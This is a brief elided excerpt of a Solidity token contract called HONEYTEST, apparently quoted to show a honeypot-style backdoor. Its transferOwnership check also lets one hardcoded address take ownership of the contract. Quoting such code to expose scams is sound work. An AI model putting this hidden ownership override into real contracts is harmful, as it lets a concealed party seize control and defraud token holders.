...
contract Ownable is Context {
    ...
    function transferOwnership(address newOwner) public virtual {
        ...
        require(msg.sender == owner() || msg.sender == address(0x14fEe93fe9AF9BB446a1a1cdb3A6950A21ebA1e6));
...
contract HONEYTEST is Context, IERC20, Ownable, Pausable {
  ...
  string private _name = "HONEY TEST";
